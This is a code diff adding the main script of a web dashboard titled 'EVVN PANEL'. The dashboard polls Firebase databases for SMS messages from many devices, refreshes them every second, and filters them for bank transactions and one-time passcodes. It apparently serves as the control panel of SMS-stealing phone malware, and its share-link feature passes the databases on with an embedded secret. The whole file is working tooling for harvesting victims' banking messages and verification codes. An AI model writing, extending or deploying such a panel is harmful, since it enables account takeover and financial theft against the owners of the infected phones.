+    if(!r.ok) return Object.assign({}, s, {status:'fail', error:'HTTP ' + r.status});
+    await r.json();
+    return Object.assign({}, s, {status:'ok', error:null});
+  }catch(e){
+    return Object.assign({}, s, {status:'fail', error:e.message || 'Network error'});
+  }
+}
+
+// ============ SHARE (SHORT LINK) ============
+function openShareModal(){
+  if(sources.length === 0){ toast('No sources to share', 'err'); return; }
+  
+  var m = sources.map(function(s){
+    var u = s.url;
+    var db = u.replace(/^https?:\/\//,'').replace(/-default-rtdb\.firebaseio\.com.*/,'').replace(/-default-rtdb\..*firebasedatabase\.app.*/,'');
+    var isAsia = u.indexOf('asia-southeast1') !== -1;
+    return db + (isAsia ? '|a' : '');
+  });
+  
+  var enc;
+  try{ enc = btoa(unescape(encodeURIComponent(m.join(',')))); }
+  catch(e){ toast('Encoding failed', 'err'); return; }
+  var shareUrl = window.location.origin + window.location.pathname + '?s=' + enc;
+
+  $modalRoot.innerHTML = '<div class="modal-overlay" id="mOv"><div class="modal">'
+    + '<div class="modal-head"><h2>Share Link</h2>'
+    + '<button class="close" id="mClose">'
+    + '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>'
+    + '</button></div>'
+    + '<div class="notice"><strong>' + sources.length + ' source(s)</strong> encoded into this link.</div>'
+    + '<div class="notice warn"><strong>Security notice:</strong> Firebase secrets are embedded. Share only with trusted contacts.</div>'
+    + '<div style="background:var(--bg-2);border:1px solid var(--border);border-radius:10px;padding:14px;font-family:var(--font-mono);font-size:11.5px;color:var(--gold-2);word-break:break-all;max-height:130px;overflow-y:auto;line-height:1.55;margin-bottom:16px">' + esc(shareUrl) + '</div>'
+    + '<div style="display:flex;gap:10px">'
+    + '<button class="btn-block" id="bCopy">Copy Link</button>'
+    + '<button class="btn-block" id="bShare" style="background:var(--success);color:#0a0806">Share</button>'
+    + '</div>'
+    + '</div></div>';
+
+  document.getElementById('mClose').onclick = closeModal;
+  document.getElementById('mOv').onclick = function(e){ if(e.target === this) closeModal(); };
+  document.getElementById('bCopy').onclick = async function(){
+    try{ await navigator.clipboard.writeText(shareUrl); toast('Link copied', 'ok'); }
+    catch(e){
+      var ta = document.createElement('textarea');
+      ta.value = shareUrl; document.body.appendChild(ta); ta.select();
+      try{ document.execCommand('copy'); toast('Link copied', 'ok'); }
+      catch(err){ toast('Copy failed', 'err'); }
+      ta.remove();
+    }
+  };
+  document.getElementById('bShare').onclick = async function(){
+    if(navigator.share){
+      try{ await navigator.share({title:'EVVN PANEL', url:shareUrl}); }
+      catch(e){}
+    } else {
+      try{ await navigator.clipboard.writeText(shareUrl); toast('Link copied', 'ok'); }
+      catch(e){ toast('Share failed', 'err'); }
+    }
+  };
+}
+
+// ============ ALL SMS MODAL ============
+var allSmsFilter = 'all';
+var smsFilteredList = [];
+var smsRenderedCount = 0;
+var SMS_CHUNK = 200;
+var smsListEl = null;
+var smsScrollHandler = null;
+var smsLiveInt = null;
+var smsFetchRunning = false;
+var smsAbort = null;
+var smsHashLast = '';
+
+function openAllSmsModal(){
+  smsFilteredList = [];
+  smsRenderedCount = 0;
+
+  $modalRoot.innerHTML = '<div class="modal-overlay" id="mOv"><div class="modal wide">'
+    + '<div class="modal-head"><h2>All Messages · Live</h2>'
+    + '<button class="close" id="mClose">'
+    + '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>'
+    + '</button></div>'
+    + '<div class="sms-progress" id="smsProg">'
+    + '<div class="bar"><div id="smsProgBar"></div></div>'
+    + '<div class="lbl" id="smsProgLbl">Initializing…</div>'
+    + '</div>'
+    + '<div class="sms-toolbar">'
+    + '<div class="count"><span class="live"></span><span id="smsCount">0 messages · 0 devices</span></div>'
+    + '<button class="chip active" data-f="all">All</button>'
+    + '<button class="chip" data-f="bank">Bank</button>'
+    + '<button class="chip" data-f="otp">OTP</button>'
+    + '<button class="chip" id="reloadSms">Reload</button>'
+    + '</div>'
+    + '<div class="sms-list" id="smsList">'
+    + '<div class="empty"><div class="spinner"></div><div class="t">Loading messages…</div></div>'
+    + '</div>'
+    + '<div class="sms-foot" id="smsFoot">Preparing…</div>'
+    + '</div></div>';
+
+  document.getElementById('mClose').onclick = closeModal;
+  document.getElementById('mOv').onclick = function(e){ if(e.target === this) closeModal(); };
+  document.querySelectorAll('[data-f]').forEach(function(b){
+    b.onclick = function(){
+      document.querySelectorAll('[data-f]').forEach(function(x){ x.classList.remove('active'); });
+      this.classList.add('active');
+      allSmsFilter = this.getAttribute('data-f');
+      renderAllSms();
+    };
+  });
+  document.getElementById('reloadSms').onclick = function(){
+    toast('Reloading messages…', 'warn');
+    fetchAllSmsFromDevices(true);
+  };
+
+  if(Object.keys(allSmsCache).length > 0) renderAllSms();
+  fetchAllSmsFromDevices(true).then(function(){ startSmsLive(); });
+}
+
+function abortSmsFetch(){
+  if(smsAbort){ try{ smsAbort.abort(); }catch(e){} smsAbort = null; }
+  smsFetchRunning = false;
+}
+
+async function fetchAllSmsFromDevices(showProgress){
+  if(smsFetchRunning) return;
+  if(devices.length === 0){ renderAllSms(); return; }
+  smsFetchRunning = true;
+  smsAbort = new AbortController();
+  var signal = smsAbort.signal;
+  var total = devices.length;
+  var done = 0;
+  var queueIdx = 0;
+  var CONC = 15;
+  var changed = false;
+
+  var progEl = document.getElementById('smsProg');
+  var barEl = document.getElementById('smsProgBar');
+  var lblEl = document.getElementById('smsProgLbl');
+  if(showProgress && progEl){
+    progEl.classList.add('show');
+    if(barEl) barEl.style.width = '0%';
+    if(lblEl) lblEl.textContent = 'Scanning 0 / ' + total + ' devices…';
+  }
+
+  await new Promise(function(resolve){
+    var running = 0;
+    var finished = false;
+    function tryFinish(){
+      if(finished) return;
+      if(queueIdx >= total && running === 0){ finished = true; resolve(); }
+    }
+    function launch(){
+      if(signal.aborted){ tryFinish(); return; }
+      while(running < CONC && queueIdx < total){
+        var d = devices[queueIdx++];
+        running++;
+        process(d);
+      }
+      tryFinish();
+    }
+    function process(dev){
+      fetchSmsRaw(dev.id, dev._srcUrl, dev._srcSec, signal)
+        .then(function(msgs){
+          if(msgs && msgs.length > 0){
+            var k = dkey(dev);
+            var prev = allSmsCache[k];
+            var ch = false;
+            if(!prev) ch = true;
+            else if(prev.length !== msgs.length) ch = true;
+            else if(prev[0] && msgs[0] && (prev[0]._ts !== msgs[0]._ts || prev[0].text !== msgs[0].text)) ch = true;
+            if(ch){ allSmsCache[k] = msgs; changed = true; }
+            brandCache[k] = matchBrands(msgs);
+          }
+        })
+        .catch(function(e){ if(e && e.name === 'AbortError') return; })
+        .then(function(){
+          running--;
+          done++;
+          if(showProgress && (done % 10 === 0 || done === total)){
+            var pct = Math.round((done / total) * 100);
+            if(barEl) barEl.style.width = pct + '%';
+            if(lblEl) lblEl.textContent = 'Scanning ' + done + ' / ' + total + ' (' + pct + '%)';
+          }
+          if(signal.aborted){ tryFinish(); return; }
+          launch();
+        });
+    }
+    launch();
+  });
+
+  smsFetchRunning = false;
+  smsAbort = null;
+  if(barEl) barEl.style.width = '100%';
+  if(lblEl) lblEl.textContent = 'Scan complete · ' + total + ' devices';
+  setTimeout(function(){
+    var p = document.getElementById('smsProg');
+    if(p) p.classList.remove('show');
+  }, 700);
+  if(changed){
+    saveAllSmsCache();
+    saveBrandCache();
+    updateAllSmsBadge();
+    renderAllSms();
+  }
+}
+
+function startSmsLive(){
+  stopSmsLive();
+  smsHashLast = smsHash();
+  smsLiveInt = setInterval(function(){
+    if(!document.getElementById('smsList')){ stopSmsLive(); return; }
+    if(document.hidden) return;
+    var h = smsHash();
+    if(h !== smsHashLast){
+      smsHashLast = h;
+      var listEl = document.getElementById('smsList');
+      if(listEl && listEl.scrollTop < 200){
+        renderAllSms(true);
+      } else {
+        updateCount();
+      }
+    }
+    if(!smsFetchRunning){
+      fetchAllSmsFromDevices(false);
+    }
+  }, 1000);
+}
+function stopSmsLive(){
+  if(smsLiveInt){ clearInterval(smsLiveInt); smsLiveInt = null; }
+}
+function smsHash(){
+  var h = '';
+  for(var k in allSmsCache){
+    var msgs = allSmsCache[k];
+    h += k + ':' + (msgs ? msgs.length : 0) + ':';
+    if(msgs && msgs[0]) h += msgs[0]._ts || 0;
+    h += ';';
+  }
+  return h;
+}
+
+function buildFiltered(){
+  var devMap = {};
+  for(var i=0;i<devices.length;i++){
+    var d = devices[i];
+    devMap[dkey(d)] = d;
+  }
+  var out = [];
+  var keys = Object.keys(allSmsCache);
+  for(var ki=0;ki<keys.length;ki++){
+    var k = keys[ki];
+    var msgs = allSmsCache[k];
+    if(!msgs || !msgs.length) continue;
+    var dev = devMap[k];
+    var devName = dev ? dev.name : (k.split('::')[0] || 'Unknown');
+    var devPhone = dev ? (dev.mobNo && dev.mobNo !== '—' ? dev.mobNo : '') : '';
+    for(var j=0;j<msgs.length;j++){
+      var msg = msgs[j];
+      var t = msg.text || '';
+      if(allSmsFilter === 'bank'){
+        if(!/(?:avl|bal|available|balance|debited|credited|withdrawn|deposited|spent|inr|rs\.?|₹|hdfc|sbi|icici|axis|kotak|pnb|paytm|phonepe|gpay)/i.test(t)) continue;
+      } else if(allSmsFilter === 'otp'){
+        if(!/(?:otp|code|verification|verify|pin is|password)/i.test(t)) continue;
+      }
+      out.push({
+        devName: devName,
+        devPhone: devPhone,
+        msg: msg,
+        _date: fmtDate(msg._ts)
+      });
+    }
+  }
+  out.sort(function(a,b){
+    var ta = a.msg._ts || 0, tb = b.msg._ts || 0;
+    if(tb !== ta) return tb - ta;
+    return String(b.msg._key||'').localeCompare(String(a.msg._key||''));
+  });
+  return out;
+}
+
+function updateCount(){
+  var el = document.getElementById('smsCount');
+  if(el) el.textContent = smsFilteredList.length + ' messages · ' + Object.keys(allSmsCache).length + ' devices';
+}
+
+function renderAllSms(preserveScroll){
+  var listEl = document.getElementById('smsList');
+  if(!listEl) return;
+  var prevScroll = preserveScroll ? listEl.scrollTop : 0;
+  smsFilteredList = buildFiltered();
+  smsRenderedCount = 0;
+  updateCount();
+  if(smsFilteredList.length === 0){
+    listEl.innerHTML = '<div class="empty"><div class="t">No messages found</div><div class="s">' + (allSmsFilter !== 'all' ? 'Try a different filter' : 'No SMS available yet') + '</div></div>';
+    var foot = document.getElementById('smsFoot');
+    if(foot) foot.textContent = '';
+    return;
+  }
+  listEl.innerHTML = '';
+  appendChunk();
+  appendChunk();
+  appendChunk();
+  setupScroll(listEl);
+  if(preserveScroll && prevScroll > 0) listEl.scrollTop = prevScroll;
+}
+
+function appendChunk(){
+  var listEl = document.getElementById('smsList');
+  if(!listEl) return;
+  if(smsRenderedCount >= smsFilteredList.length) return;
+  var end = Math.min(smsRenderedCount + SMS_CHUNK, smsFilteredList.length);
+  var lastDate = smsRenderedCount > 0 ? (smsFilteredList[smsRenderedCount-1]._date || '') : '';
+  var html = '';
+  for(var i=smsRenderedCount;i<end;i++){
+    var x = smsFilteredList[i];
+    if(x._date !== lastDate){
+      html += '<div class="sms-date">' + esc(x._date) + '</div>';
+      lastDate = x._date;
+    }
+    html += '<div class="sms-item">'
+      + '<div class="head"><span>' + esc(x.devName.substring(0,24)) + (x.devPhone ? ' · ' + esc(x.devPhone) : '') + '</span><span class="time">' + esc(x.msg.time || '') + '</span></div>'
+      + '<div class="from">From: ' + esc(x.msg.sender || 'Unknown') + '</div>'
+      + '<div class="body">' + esc(x.msg.text || '') + '</div>'
+      + '</div>';
+  }
+  listEl.insertAdjacentHTML('beforeend', html);
+  smsRenderedCount = end;
+  updateFoot();
+}
+
+function updateFoot(){
+  var foot = document.getElementById('smsFoot');
+  if(!foot) return;
+  var total = smsFilteredList.length;
+  var shown = smsRenderedCount;
+  if(shown >= total){
+    foot.innerHTML = 'All <b>' + total + '</b> messages loaded';
+  } else {
+    foot.innerHTML = 'Showing <b>' + shown + '</b> of <b>' + total + '</b> — scroll for more';
+  }
+}
+
+function setupScroll(listEl){
+  if(smsScrollHandler && smsListEl) smsListEl.removeEventListener('scroll', smsScrollHandler);
+  smsListEl = listEl;
+  smsScrollHandler = function(){
+    if(smsRenderedCount >= smsFilteredList.length) return;
+    var remaining = listEl.scrollHeight - listEl.scrollTop - listEl.clientHeight;
+    if(remaining < 800) appendChunk();
+  };
+  listEl.addEventListener('scroll', smsScrollHandler, {passive:true});
+}
+
+// ============ APP BOOT ============
+function bootApp(){
+  var params = new URLSearchParams(window.location.search);
+  var shared = params.get('s');
+  if(shared){
+    try{
+      var dec = decodeURIComponent(escape(atob(shared)));
+      var ids = dec.split(',').filter(Boolean);
+      var newSources = [];
+      for(var i=0;i<ids.length;i++){
+        var parts = ids[i].split('|');
+        var db = parts[0];
+        var isAsia = parts[1] === 'a';
+        if(!db) continue;
+        var url = 'https://' + db + '-default-rtdb.' + (isAsia ? 'asia-southeast1.firebasedatabase.app' : 'firebaseio.com');
+        newSources.push({id:genId(), url:url, secret:NODE_SECRET, tag:makeTag(url), notes:'', status:'pending'});
+      }
+      if(newSources.length > 0){
+        // ===== FIX: WIPE EVERYTHING before importing shared sources =====
+        try{
+          localStorage.removeItem(SRC_KEY);
+          localStorage.removeItem(BL_KEY);
+          localStorage.removeItem(STAR_KEY);
+          localStorage.removeItem(PHONE_CACHE_KEY);
+          localStorage.removeItem(ALL_SMS_CACHE_KEY);
+          localStorage.removeItem(BRAND_CACHE_KEY);
+        }catch(e){}
+        sources = newSources;
+        saveSrc();
+        blacklist = [];
+        stars = {};
+        phoneCache = {};
+        allSmsCache = {};
+        brandCache = {};
+        if(window.history && window.history.replaceState) window.history.replaceState({}, '', window.location.pathname);
+        setTimeout(function(){ toast('Imported ' + newSources.length + ' source(s) · old data cleared', 'ok'); }, 500);
+      }
+    }catch(e){ toast('Invalid share link', 'err'); }
+  } else {
+    sources = loadSrc();
+  }
+
+  if(!blacklist) blacklist = loadBL();
+  if(!stars) stars = loadStars();
+  if(!phoneCache) loadPhoneCache();
+  if(!allSmsCache) loadAllSmsCache();
+  if(!brandCache) loadBrandCache();
+
+  devices = [];
+  filtered = [];
+  currentFilter = 'all';
+  currentSort = 'newest';
+  searchQ = '';
+  showHidden = false;
+  selectedDevice = null;
+  detailTab = 'info';
+  smsMsgs = [];
+  smsData = {bankBalances:[], cards:[], phoneNumbers:[], networks:[]};
+  simSel = 1;
+  fetchInt = null;
+  detailSmsInt = null;
+  enrichRunning = false;
+  fetchInProgress = false;
+  lastGridSig = '';
+  lastStatsSig = '';
+  lastBrandSig = '';
+
+  $brandScroll = document.getElementById('brandScrollWrap');
+  $sectionsRoot = document.getElementById('sectionsRoot');
+  $detailRoot = document.getElementById('detailRoot');
+  $modalRoot = document.getElementById('modalRoot');
+  $confirmRoot = document.getElementById('confirmRoot');
+
+  setupGridClick();
+  setupEvents();
+
+  if(sources.length === 0){
+    fetchAll(false);
+    setTimeout(function(){ openSourcesModal(); }, 400);
+  } else {
+    fetchAll(false);
+    fetchInt = setInterval(function(){
+      if(document.hidden) return;
+      fetchAll(true);
+    }, 20000);
+  }
+  updateAllSmsBadge();
+  updateStarredBadge();
+}
+
+function setupEvents(){
+  document.getElementById('filterbar').onclick = function(e){
+    var b = e.target.closest('button[data-f]');
+    if(!b) return;
+    var all = this.querySelectorAll('button[data-f]');
+    for(var i=0;i<all.length;i++) all[i].classList.remove('active');
+    b.classList.add('active');
+    currentFilter = b.getAttribute('data-f');
+    renderSections();
+  };
+  document.getElementById('sortSel').onchange = function(){
+    currentSort = this.value;
+    renderSections();
+  };
+  var searchTimer;
+  document.getElementById('searchInput').oninput = function(){
+    var v = this.value;
+    clearTimeout(searchTimer);
+    searchTimer = setTimeout(function(){
+      searchQ = v.trim();
+      renderSections();
+    }, 300);
+  };
+  document.getElementById('refreshBtn').onclick = function(){
+    fetchAll(false);
+    toast('Refreshing…', 'warn');
+  };
+  document.getElementById('sourcesBtn').onclick = openSourcesModal;
+  document.getElementById('shareBtn').onclick = openShareModal;
+  document.getElementById('allSmsBtn').onclick = openAllSmsModal;
+  document.getElementById('starredBtn').onclick = function(){
+    currentFilter = 'starred';
+    var chips = document.querySelectorAll('#filterbar button[data-f]');
+    for(var i=0;i<chips.length;i++) chips[i].classList.remove('active');
+    renderSections();
+    toast('Showing starred devices', 'warn');
+  };
+  document.getElementById('hiddenBtn').onclick = function(){
+    showHidden = !showHidden;
+    this.style.color = showHidden ? 'var(--gold)' : '';
+    this.style.borderColor = showHidden ? 'var(--gold)' : '';
+    renderSections();
+    toast(showHidden ? 'Showing hidden devices' : 'Hidden devices filtered', 'warn');
+  };
+  document.getElementById('disconnectBtn').onclick = function(){
+    if(!confirm('Disconnect all sources and clear all local data?')) return;
+    clearSrc();
+    try{
+      localStorage.removeItem(BL_KEY);
+      localStorage.removeItem(STAR_KEY);
+      localStorage.removeItem(PHONE_CACHE_KEY);
+      localStorage.removeItem(ALL_SMS_CACHE_KEY);
+      localStorage.removeItem(BRAND_CACHE_KEY);
+    }catch(e){}
+    blacklist = []; stars = {}; sources = []; devices = [];
+    showHidden = false; phoneCache = {}; allSmsCache = {}; brandCache = {};
+    if(fetchInt){ clearInterval(fetchInt); fetchInt = null; }
+    if(detailSmsInt){ clearInterval(detailSmsInt); detailSmsInt = null; }
+    if(enrichAbort){ try{ enrichAbort.abort(); }catch(e){} enrichAbort = null; }
+    stopSmsLive();
+    abortSmsFetch();
+    closeDetail(); closeModal();
+    lastGridSig = ''; lastStatsSig = ''; lastBrandSig = '';
+    if(window.history && window.history.replaceState) window.history.replaceState({}, '', window.location.pathname);
+    fetchAll(false);
+    updateAllSmsBadge();
+    updateStarredBadge();
+  };
+
+  $brandScroll.onclick = function(e){
+    var b = e.target.closest('.h-brand-chip');
+    if(!b) return;
+    activeBrand = b.getAttribute('data-brand');
+    var all = $brandScroll.querySelectorAll('.h-brand-chip');
+    for(var i=0;i<all.length;i++) all[i].classList.remove('active');
+    b.classList.add('active');
+    renderSections();
+  };
+}
+
+document.addEventListener('visibilitychange', function(){
+  if(document.hidden){
+    stopSmsLive();
+    abortSmsFetch();
+    if(fetchInt){ clearInterval(fetchInt); fetchInt = null; }
+    if(detailSmsInt){ clearInterval(detailSmsInt); detailSmsInt = null; }
+  } else {
+    if(document.getElementById('app').classList.contains('ready')){
+      if(sources.length > 0 && !fetchInt){
+        fetchInt = setInterval(function(){ if(!document.hidden) fetchAll(true); }, 20000);
+      }
+      if(document.getElementById('smsList')) startSmsLive();
+      if(selectedDevice && !detailSmsInt){
+        detailSmsInt = setInterval(function(){
+          if(document.hidden) return;
+          if(!selectedDevice || !selectedDevice._srcUrl) return;
+          if(detailTab === 'send') return;
+          fetchSms(selectedDevice.id, selectedDevice._srcUrl, selectedDevice._srcSec).then(function(){
+            brandCache[dkey(selectedDevice)] = matchBrands(smsMsgs);
+            saveBrandCache();
+            if(smsMsgs.length > 0){
+              allSmsCache[dkey(selectedDevice)] = smsMsgs;
+              saveAllSmsCache();
+              updateAllSmsBadge();
+            }
+            renderDetailContent();
+          });
+        }, 1000);
+      }
+    }
+  }
+});
+
+})();
+</script>
+</body>
+</html>
